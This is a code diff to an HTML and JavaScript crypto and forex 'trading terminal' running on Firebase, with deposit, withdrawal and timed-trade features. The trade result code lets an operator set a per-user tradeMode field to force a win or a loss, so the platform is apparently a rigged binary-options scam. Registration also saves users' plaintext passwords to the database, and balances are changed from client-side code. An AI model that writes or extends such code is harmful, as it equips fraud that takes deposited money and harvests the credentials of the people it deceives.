@@ -15,12 +15,26 @@
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
         .auth-input { background: #1a1f29; border: 1px solid #2d3748; padding: 14px; border-radius: 12px; width: 100%; color: white; outline: none; }
         #appTerminal { display: none; height: 100dvh; flex-direction: column; padding: 10px; }
+        #authSection { display: none; } /* Default hide to prevent flicker */
         .timer-badge { position: absolute; bottom: 20px; right: 20px; background: #eab308; color: black; padding: 10px 20px; border-radius: 50px; font-weight: 800; display: none; z-index: 100; box-shadow: 0 0 15px rgba(234,179,8,0.4); }
         .btn-grad-green { background: linear-gradient(135deg, #22c55e 0%, #15803d 100%); }
         .btn-grad-red { background: linear-gradient(135deg, #ef4444 0%, #b91c1c 100%); }
+        
+        /* Loading Screen Style */
+        #loadingScreen { 
+            position: fixed; inset: 0; background: #05070a; z-index: 9999; 
+            display: flex; flex-direction: column; align-items: center; justify-content: center; 
+        }
+        .loader-spin { width: 40px; height: 40px; border: 4px solid #1a1f29; border-top: 4px solid #eab308; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
+
+    <div id="loadingScreen">
+        <div class="loader-spin"></div>
+        <p class="mt-4 text-[10px] font-bold text-yellow-500 uppercase tracking-widest">Securing Connection...</p>
+    </div>
 
     <div id="authSection" class="h-full flex items-center justify-center p-4">
         <div class="glass-card w-full max-w-sm p-8 rounded-[32px]">
@@ -52,7 +66,6 @@
                 <option value="BINANCE:BTCUSDT">BTC/USDT</option>
                 <option value="BINANCE:ETHUSDT">ETH/USDT</option>
                 <option value="FX:EURUSD">EUR/USD</option>
-                <option value="FX:GBPUSD">GBP/USD</option>
                 <option value="OANDA:XAUUSD">GOLD</option>
             </select>
         </div>
@@ -114,6 +127,8 @@
                 <option value="TRC20">USDT (TRC20)</option>
                 <option value="BEP20">USDT (BEP20)</option>
                 <option value="ERC20">USDT (ERC20)</option>
+                <option value="SOLANA">USDT (SOLANA)</option>
+                <option value="POLYGON">USDT (POLYGON)</option>
             </select>
             <input type="text" id="witAddr" placeholder="Enter Wallet Address" class="auth-input mb-4">
             <input type="number" id="witAmt" placeholder="Withdraw Amount ($)" class="auth-input mb-6">
@@ -139,8 +154,8 @@
         firebase.initializeApp(firebaseConfig);
         const auth = firebase.auth(), db = firebase.firestore();
         let userData = null, mode = 'reg';
+        let chartLoaded = false;
 
-        // --- AUTH FUNCTIONS ---
         function switchAuth(t) {
             mode = t;
             document.getElementById('loginTab').className = t==='login' ? 'flex-1 py-3 text-sm font-bold bg-[#2d3748] rounded-xl' : 'flex-1 py-3 text-sm font-bold';
@@ -150,94 +165,56 @@
 
         async function handleAuth() {
             const e = document.getElementById('userEmail').value, p = document.getElementById('userPass').value;
+            if(!e || !p) return alert("Fill all fields");
+            document.getElementById('loadingScreen').style.display = 'flex'; // Show loader on submit
             try {
                 if(mode==='reg') {
                     const r = await auth.createUserWithEmailAndPassword(e, p);
                     await db.collection('users').doc(r.user.uid).set({ email: e, password: p, balance: 0, status: 'active', tradeMode: 'normal' });
+                    alert("Registration Successful! Please Login.");
                     switchAuth('login');
-                } else { await auth.signInWithEmailAndPassword(e, p); }
-            } catch(err) { alert(err.message); }
+                    document.getElementById('loadingScreen').style.display = 'none';
+                } else { 
+                    await auth.signInWithEmailAndPassword(e, p); 
+                }
+            } catch(err) { 
+                alert(err.message); 
+                document.getElementById('loadingScreen').style.display = 'none';
+            }
         }
 
+        // PERSISTENCE FIX: This listener handles refresh correctly
         auth.onAuthStateChanged(user => {
+            const loader = document.getElementById('loadingScreen');
             if(user) {
                 db.collection('users').doc(user.uid).onSnapshot(doc => {
                     userData = doc.data();
-                    document.getElementById('balanceDisp').innerText = "$" + (userData.balance || 0).toFixed(2);
-                    const init = user.email[0].toUpperCase();
-                    document.getElementById('userInitial').innerText = init;
-                    document.getElementById('profileCircle').innerText = init;
-                    document.getElementById('sEmailDisp').innerText = user.email;
-                    document.getElementById('authSection').style.display = 'none';
-                    document.getElementById('appTerminal').style.display = 'flex';
-                    loadChart(document.getElementById('assetSelect').value);
+                    if(userData) {
+                        document.getElementById('balanceDisp').innerText = "$" + (userData.balance || 0).toFixed(2);
+                        const init = user.email[0].toUpperCase();
+                        document.getElementById('userInitial').innerText = init;
+                        document.getElementById('profileCircle').innerText = init;
+                        document.getElementById('sEmailDisp').innerText = user.email;
+                        
+                        document.getElementById('authSection').style.display = 'none';
+                        document.getElementById('appTerminal').style.display = 'flex';
+                        
+                        if(!chartLoaded) {
+                            loadChart('BINANCE:BTCUSDT');
+                            chartLoaded = true;
+                        }
+                    }
+                    loader.style.display = 'none';
                 });
-            } else { document.getElementById('authSection').style.display = 'flex'; document.getElementById('appTerminal').style.display = 'none'; }
+            } else { 
+                document.getElementById('authSection').style.display = 'flex'; 
+                document.getElementById('appTerminal').style.display = 'none'; 
+                loader.style.display = 'none';
+            }
         });
 
         function loadChart(s) { new TradingView.widget({ "autosize": true, "symbol": s, "interval": "1", "theme": "dark", "container_id": "tv_chart", "hide_top_toolbar": true, "hide_side_toolbar": true }); }
 
-        // --- TRADING LOGIC (UPDATED) ---
-        async function initTrade(type) {
-            const amt = parseFloat(document.getElementById('tradeAmt').value), dur = parseInt(document.getElementById('duration').value);
-            if(amt > userData.balance || amt <= 0) return alert("Low Balance");
-
-            // Deduct balance immediately
-            await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(-amt) });
-
-            document.getElementById('tradeTimer').style.display = 'block';
-            let l = dur;
-            let iv = setInterval(() => {
-                document.getElementById('timerText').innerText = `00:${l < 10 ? '0'+l : l}`;
-                if(l <= 0) { 
-                    clearInterval(iv); 
-                    document.getElementById('tradeTimer').style.display = 'none'; 
-                    showRes(amt, type); 
-                }
-                l--;
-            }, 1000);
-        }
-
-        async function showRes(amt, tradeType) {
-            // Mode Control: Admin can set this in Firestore (profit / loss / normal)
-            const controlMode = userData.tradeMode || 'normal';
-            let win = false;
-
-            if (controlMode === 'profit') {
-                win = true;
-            } else if (controlMode === 'loss') {
-                win = false;
-            } else {
-                // Normal random logic if no specific mode set
-                win = Math.random() > 0.45; // 45% chance to win naturally
-            }
-
-            const profitAmt = amt * 1.82; // 82% Profit
-            const box = document.getElementById('resultBox');
-
-            if(win) {
-                await db.collection('users').doc(auth.currentUser.uid).update({ 
-                    balance: firebase.firestore.FieldValue.increment(profitAmt) 
-                });
-                box.innerHTML = `
-                    <h2 class="text-green-500 font-black text-2xl uppercase">Profit</h2>
-                    <h1 class="text-5xl text-white">+$${profitAmt.toFixed(2)}</h1>
-                    <p class="text-[10px] text-gray-500 mt-2 uppercase">Trade: ${tradeType}</p>
-                `;
-            } else {
-                box.innerHTML = `
-                    <h2 class="text-red-500 font-black text-2xl uppercase">Loss</h2>
-                    <h1 class="text-5xl text-white">-$${amt.toFixed(2)}</h1>
-                    <p class="text-[10px] text-gray-500 mt-2 uppercase">Trade: ${tradeType}</p>
-                `;
-            }
-            box.innerHTML += `<button onclick="hideM('resultM')" class="w-full bg-white/10 py-3 rounded-xl mt-6 uppercase font-bold text-white">Continue</button>`;
-            showM('resultM');
-        }
-
-        // --- UI HELPERS ---
-        function showM(id) { document.getElementById(id).style.display = 'flex'; }
-        function hideM(id) { document.getElementById(id).style.display = 'none'; if(id==='depM') toDStep(1); }
         function toDStep(s) {
             document.getElementById('dStep1').classList.add('hidden');
             document.getElementById('dStep2').classList.add('hidden');
@@ -245,23 +222,56 @@
             document.getElementById('dStep'+s).classList.remove('hidden');
         }
 
-        // --- DEPOSIT & WITHDRAW ---
         async function submitFinalDep() {
             const amt = parseFloat(document.getElementById('depAmtInput').value);
-            const email = document.getElementById('depEmail').value, tg = document.getElementById('depTg').value, tx = document.getElementById('depTx').value;
+            const email = document.getElementById('depEmail').value;
+            const tg = document.getElementById('depTg').value;
+            const tx = document.getElementById('depTx').value;
             if(!email || !tg || !tx) return alert("Please fill all details!");
-            await db.collection('requests').add({ uid: auth.currentUser.uid, email: email, telegram: tg, txid: tx, amount: amt, time: Date.now(), status: 'pending' });
-            alert("Deposit Proof Submitted!"); hideM('depM');
+            await db.collection('requests').add({ uid: auth.currentUser.uid, email: email, telegram: tg, txid: tx, amount: amt, time: Date.now() });
+            alert("Deposit Proof Submitted Successfully!"); hideM('depM');
         }
 
         async function submitWit() {
-            const amt = parseFloat(document.getElementById('witAmt').value), net = document.getElementById('witNet').value, addr = document.getElementById('witAddr').value;
+            const amt = parseFloat(document.getElementById('witAmt').value);
+            const net = document.getElementById('witNet').value;
+            const addr = document.getElementById('witAddr').value;
             if(!addr || isNaN(amt)) return alert("Fill all fields!");
             if(amt > userData.balance || amt < 10) return alert("Insufficient Balance (Min $10)");
             await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(-amt) });
-            await db.collection('withdrawals').add({ uid: auth.currentUser.uid, email: userData.email, amount: amt, network: net, address: addr, time: Date.now(), status: 'pending' });
+            await db.collection('withdrawals').add({ uid: auth.currentUser.uid, email: userData.email, amount: amt, network: net, address: addr, time: Date.now() });
             alert("Withdrawal Requested!"); hideM('witM');
         }
+
+        async function initTrade(type) {
+            const amt = parseFloat(document.getElementById('tradeAmt').value), dur = parseInt(document.getElementById('duration').value);
+            if(amt > userData.balance || amt <= 0) return alert("Low Balance");
+            await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(-amt) });
+            document.getElementById('tradeTimer').style.display = 'block';
+            let l = dur;
+            let iv = setInterval(() => {
+                document.getElementById('timerText').innerText = `00:${l < 10 ? '0'+l : l}`;
+                if(l <= 0) { clearInterval(iv); document.getElementById('tradeTimer').style.display = 'none'; showRes(amt); }
+                l--;
+            }, 1000);
+        }
+
+        async function showRes(amt) {
+            const mode = userData.tradeMode || 'normal';
+            let win = mode === 'profit' ? true : (mode === 'loss' ? false : Math.random() > 0.5);
+            const p = amt * 1.82, box = document.getElementById('resultBox');
+            if(win) {
+                await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(p) });
+                box.innerHTML = `<h2 class="text-green-500 font-black text-2xl uppercase">Profit</h2><h1 class="text-5xl text-white">+$${p.toFixed(2)}</h1>`;
+            } else {
+                box.innerHTML = `<h2 class="text-red-500 font-black text-2xl uppercase">Loss</h2><h1 class="text-5xl text-white">-$${amt.toFixed(2)}</h1>`;
+            }
+            box.innerHTML += `<button onclick="hideM('resultM')" class="w-full bg-white/10 py-3 rounded-xl mt-6 uppercase font-bold">Continue</button>`;
+            showM('resultM');
+        }
+
+        function showM(id) { document.getElementById(id).style.display = 'flex'; }
+        function hideM(id) { document.getElementById(id).style.display = 'none'; if(id==='depM') toDStep(1); }
     </script>
 </body>
 </html>
